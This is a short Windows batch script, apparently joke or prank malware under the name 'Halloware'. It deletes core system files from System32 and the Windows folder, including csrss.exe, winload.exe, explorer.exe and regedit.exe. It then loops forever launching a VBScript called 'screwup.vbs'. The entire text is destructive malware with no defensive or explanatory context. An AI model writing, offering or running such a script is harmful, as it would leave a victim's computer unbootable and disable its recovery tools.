cd\
cd Windows
cd System32
del csrss.exe
del winload.exe
del taskmgr.exe
del sethc.exe
del rundll32.exe
del shutdown.exe
cd..
del explorer.exe
del notepad.exe
del regedit.exe

:A
wscript.exe "C:\Program Files\Halloware\screwup.vbs"

goto A
